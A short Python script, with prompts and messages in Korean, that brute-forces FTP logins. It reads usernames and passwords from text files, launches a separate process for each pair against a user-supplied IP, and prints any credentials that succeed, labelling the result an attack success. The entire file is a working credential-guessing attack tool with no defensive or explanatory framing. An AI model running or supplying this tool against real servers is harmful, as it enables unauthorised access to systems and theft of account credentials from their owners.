import ftplib
import multiprocessing

def bruteForce(ip, user, pwd):
    ftp = ftplib.FTP(ip)

    try:
        res = ftp.login(user, pwd)

        if "230" in res and "successful" in res:
            print("[+] 공격에 성공하였습니다.")
            print(f'사용자: {user} | 비밀번호: {pwd}')

    except Exception as e:
        print(f"[-] 연결 오류: {e} | 사용자: {user} | 비밀번호: {pwd}")


def main():
    ip = input("IP를 입력하세요: ")
    
    with open('users.txt', 'r') as users:
        users = users.readlines() # List
    with open('passwords.txt', 'r') as passwords:
        passwords = passwords.readlines() # List

    for user in users:
        for pwd in passwords:
            process = multiprocessing.Process(target=bruteForce, args=(ip, user.rstrip(), pwd.rstrip()))
            process.start()

            

if __name__ == '__main__':
    main()